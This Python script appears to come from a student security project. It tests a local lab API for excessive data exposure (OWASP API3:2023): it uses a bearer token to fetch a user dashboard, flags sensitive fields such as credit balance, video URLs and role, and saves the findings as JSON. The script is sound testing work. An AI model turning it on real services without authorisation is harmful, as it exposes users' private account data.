#!/usr/bin/env python3
"""
ATTACK 5: Broken Object Property Level Authorisation
OWASP: API3:2023
What: API returns sensitive fields it shouldn't
How: Access dashboard and check what data is returned
Why dangerous: Exposes credit balance, video URLs, role info
"""
import requests
import json
import datetime

TARGET = "http://localhost:8888"
RESULTS = "/home/xd-strange24/mscproject/experiments"

SENSITIVE_FIELDS = [
    "available_credit",
    "video_url",
    "video_name", 
    "video_id",
    "role",
    "picture_url"
]

def run(token):
    print("=" * 55)
    print("ATTACK 5: BROKEN OBJECT PROPERTY (API3:2023)")
    print("Excessive Data Exposure")
    print("=" * 55)

    endpoint = TARGET + "/identity/api/v2/user/dashboard"
    headers = {"Authorization": "Bearer " + token}

    print("[*] Target: " + endpoint)
    print("[*] Requesting user dashboard...\n")

    try:
        r = requests.get(endpoint, headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            all_fields = list(data.keys())
            exposed = []

            print("[!] API returned these fields:")
            for field in all_fields:
                value = str(data[field])
                if field in SENSITIVE_FIELDS:
                    print("[SENSITIVE] " + field + ": " + value)
                    exposed.append(field)
                else:
                    print("[  NORMAL] " + field + ": " + value[:30])

            print("\n[RESULT] " + str(len(exposed)) + " sensitive fields exposed")
            print("[RESULT] App should filter these before returning")
            print("[SEVERITY] MEDIUM")

            result = {
                "attack": "Broken Object Property",
                "owasp": "API3:2023",
                "timestamp": datetime.datetime.now().isoformat(),
                "endpoint": endpoint,
                "all_fields_returned": all_fields,
                "sensitive_fields_exposed": exposed,
                "severity": "MEDIUM"
            }

            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            path = RESULTS + "/attack5_objproperty_" + ts + ".json"
            with open(path, "w") as f:
                json.dump(result, f, indent=2)
            print("[SAVED] " + path)
            return result

    except Exception as e:
        print("[ERROR] " + str(e))

if __name__ == "__main__":
    token = input("Enter Bearer token: ").strip()
    run(token)
